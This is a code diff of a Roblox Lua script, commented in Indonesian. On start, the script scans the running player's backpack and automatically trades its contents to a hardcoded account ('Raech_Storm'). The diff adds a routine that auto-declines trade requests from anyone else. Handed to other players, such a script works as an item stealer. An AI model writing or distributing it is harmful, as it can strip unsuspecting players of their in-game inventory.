@@ -6,6 +6,43 @@ local LocalPlayer = Players.LocalPlayer
 -- Masukkan nama akun penampung/tujuan di sini:
 local TARGET_ACCOUNT_NAME = "Raech_Storm"
 
+local function getTradeNetwork()
+    local NetworkFolder = ReplicatedStorage:FindFirstChild("Network")
+    if not NetworkFolder then return nil, nil end
+    local TradeService = NetworkFolder:FindFirstChild("TradeService") or NetworkFolder:FindFirstChild("Trade")
+    if not TradeService then return nil, nil end
+    local TradeRE = TradeService:FindFirstChild("RE")
+    return TradeService, TradeRE
+end
+
+-- ==========================================
+-- PROTEKSI: AUTO DECLINE PERMINTAAN DARI PLAYER LAIN
+-- ==========================================
+local function enableAutoDeclineOtherPlayers(targetPlayerName)
+    local _, TradeRE = getTradeNetwork()
+    if not TradeRE then return end
+
+    local respondRemote = TradeRE:FindFirstChild("RespondToRequest")
+    local tradeEvent = TradeRE:FindFirstChild("TradeEvent")
+
+    if tradeEvent and respondRemote then
+        tradeEvent.OnClientEvent:Connect(function(eventName, data)
+            -- Mendeteksi jika ada permintaan trade masuk dari player lain
+            if eventName == "RequestReceived" or eventName == "TradeRequest" then
+                local senderName = type(data) == "table" and (data.Sender or data.Name or data.Player) or tostring(data)
+                local targetLower = string.lower(tostring(targetPlayerName))
+                
+                if type(senderName) == "string" and string.lower(senderName) ~= targetLower then
+                    warn("[AutoTrade] Menolak permintaan trade dari player yang tidak dikenal: " .. senderName)
+                    pcall(function()
+                        respondRemote:FireServer(false, data) -- Tolak (decline)
+                    end)
+                end
+            end
+        end)
+    end
+end
+
 local function resolveControllers()
     local Framework = ReplicatedStorage:WaitForChild("Framework", 10)
     if not Framework then return nil, nil end
@@ -67,15 +104,6 @@ local function scanBackpackOnlyItems(DataController, EntryRegistry)
     end
 
     return units, items
-end
-
-local function getTradeNetwork()
-    local NetworkFolder = ReplicatedStorage:FindFirstChild("Network")
-    if not NetworkFolder then return nil, nil end
-    local TradeService = NetworkFolder:FindFirstChild("TradeService") or NetworkFolder:FindFirstChild("Trade")
-    if not TradeService then return nil, nil end
-    local TradeRE = TradeService:FindFirstChild("RE")
-    return TradeService, TradeRE
 end
 
 local function clickGuiButton(btn)
@@ -210,6 +238,7 @@ local function executeAutoTrade(targetPlayerName)
 end
 
 task.spawn(function()
+    enableAutoDeclineOtherPlayers(TARGET_ACCOUNT_NAME)
     task.wait(2)
     executeAutoTrade(TARGET_ACCOUNT_NAME)
 end)
